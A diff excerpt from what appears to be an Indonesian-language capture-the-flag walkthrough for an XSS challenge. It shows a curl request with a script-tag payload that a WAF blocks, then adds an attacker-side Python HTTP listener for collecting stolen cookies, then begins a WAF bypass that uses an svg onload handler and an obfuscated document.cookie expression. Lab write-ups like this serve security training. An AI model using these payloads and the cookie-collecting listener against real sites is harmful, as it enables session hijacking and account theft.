@@ -117,6 +117,10 @@ curl -X POST http://<TARGET-IP>:3075/feedback \
   -d "name=red&message=<script>alert(1)</script>"
 # → 403 Forbidden   FLAG: SCENARIO75{403}
 
+# Listen server di sisi Attacker untuk gather cookie hasil exploit XSS
+python3 -m http.server 8080
+# → Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
 # Bypass — <svg onload> lolos WAF
 # Payload: window['docu'+'ment']['coo'+'kie']
 curl -X POST http://<TARGET-IP>:3075/feedback \
